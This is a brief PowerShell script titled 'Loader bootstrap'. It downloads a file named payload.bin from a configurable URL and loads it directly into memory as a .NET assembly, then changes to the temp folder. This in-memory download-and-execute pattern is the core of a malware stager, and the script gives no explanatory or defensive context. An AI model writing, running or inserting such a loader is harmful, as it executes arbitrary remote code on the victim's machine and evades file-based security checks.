<# Loader bootstrap #>
[CmdletBinding()]
param(
    [string]$PayloadUrl = "https://internal.corp/payload.bin"
)
$ManagedBytes = (New-Object System.Net.WebClient).DownloadData($PayloadUrl)
[Reflection.Assembly]::Load($ManagedBytes)
Set-Location -Path $env:TEMP
